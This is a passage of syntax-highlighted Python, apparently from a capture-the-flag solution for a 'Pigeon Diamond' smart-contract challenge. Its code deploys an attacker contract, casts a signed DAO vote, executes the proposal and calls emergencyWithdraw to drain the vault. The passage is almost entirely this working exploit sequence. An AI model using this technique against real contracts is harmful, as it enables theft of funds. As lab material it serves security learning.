</span></span><span class="line"><span class="cl"><span class="n">setup_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">setup_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">setup_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;pigeonDiamond()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">setup_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">pigeon_diamond_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pigeon_diamond_address</span> <span class="si">= }</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">pigeon_diamond_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check FeatherCoinFacet</span>
</span></span><span class="line"><span class="cl"><span class="n">fc_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;payable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;claim&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;claimed&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;daoFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DAOFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;diamondCutFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DiamondCutFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;diamondLoupeFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract DiamondLoupeFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ftcFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract FeatherCoinFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;initDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract InitDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ownershipFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract OwnershipFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeonDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PigeonDiamond&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pigeonVaultFacet&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract PigeonVaultFacet&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">fc_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">pigeon_diamond_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">fc_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;name()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">pigeon_diamond_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Deploy attacker contract</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_src</span> <span class="o">=</span> <span class="n">compile_files</span><span class="p">([</span><span class="s1">&#39;Attacker.sol&#39;</span><span class="p">],</span> <span class="n">output_values</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">],</span> <span class="n">import_remappings</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;@openzeppelin/=../lib/openzeppelin-contracts/&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">compiled_attacker</span> <span class="o">=</span> <span class="n">compiled_src</span><span class="p">[</span><span class="s1">&#39;Attacker.sol:Attacker&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">],</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="n">pigeon_diamond_address</span><span class="p">,</span> <span class="n">setup_address</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;from&#34;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;value&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rcpt</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">rcpt</span><span class="p">[</span><span class="s1">&#39;contractAddress&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">attacker_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">attacker_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">compiled_attacker</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">attacker_address</span> <span class="si">= }</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">attacker_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call vote</span>
</span></span><span class="line"><span class="cl"><span class="n">_sig</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">signHash</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x19</span><span class="s1">Ethereum Signed Message:</span><span class="se">\n</span><span class="s1">32&#39;</span><span class="p">),</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)[</span><span class="s1">&#39;signature&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">castVote</span><span class="p">(</span><span class="n">_sig</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Sleep 1 minute after cast vote...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call execute</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">attacker_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">execute</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call emergencyWithdraw</span>
</span></span><span class="line"><span class="cl"><span class="n">vault_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;anonymous&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;account&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;amount&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Deposit&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;event&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;contractBalance&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;emergencyWithdraw&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;getContractAddress&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">vault_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">pigeon_diamond_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">vault_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">vault_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">emergencyWithdraw</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
